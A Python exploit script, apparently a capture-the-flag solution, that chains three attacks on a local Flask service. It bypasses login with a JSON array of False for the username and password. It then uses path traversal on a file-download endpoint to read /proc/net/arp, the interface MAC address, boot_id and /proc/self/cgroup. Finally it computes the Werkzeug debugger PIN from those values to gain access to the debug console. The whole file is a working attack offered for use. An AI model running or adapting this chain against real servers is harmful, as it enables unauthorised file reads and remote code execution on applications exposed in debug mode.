import requests

from werkzeug_pin import create_random_id,parse_arp_file, parse_mac_address, resolve_pin

TARGET = "localhost"
PORT = 1337

def authenticate(session: requests.Session) -> requests.Response:
    payload = {"username": [False],"password": [False]}
    response = session.post(f"http://{TARGET}:{PORT}/api/login", json=payload)
    return response

def request_file(file_path: str, session: requests.session) -> str:
    file_path = file_path[1:] if file_path[0] == "/" else file_path
    params = {"file": f"../../../../../{file_path}"}
    response = session.get(f"http://{TARGET}:{PORT}/api/ipc_download", params=params)
    return response.text if response.ok else None



def main():
    session = requests.session()
    authenticate(session=session)
    arp_file = request_file("/proc/net/arp", session)
    arp_entries = parse_arp_file(arp_file)
    # mac_address = parse_mac_address(arp_entries[0].get('hw_address'))
    device_id = arp_entries[0].get('device')
    mac_address_hex = request_file(f"/sys/class/net/{device_id}/address", session)
    mac_address = parse_mac_address(mac_address_hex)
    boot_id = request_file("/proc/sys/kernel/random/boot_id", session)
    # machine_id = request_file("/etc/machine-id", session)
    machine_id = None
    cgroup_file = request_file("/proc/self/cgroup", session)
    cgroup = cgroup_file.split('\n')[0].split('/')[-1]
    random_id = create_random_id(machine_id, boot_id, cgroup)

    pin = resolve_pin(
        running_user='root',
        path_to_flask='/usr/local/lib/python3.11/site-packages/flask/app.py',
        mac_address=mac_address,
        random_id=random_id
    )
    print(f"Werkzeug pin: {pin}")

if __name__ == "__main__":
    main()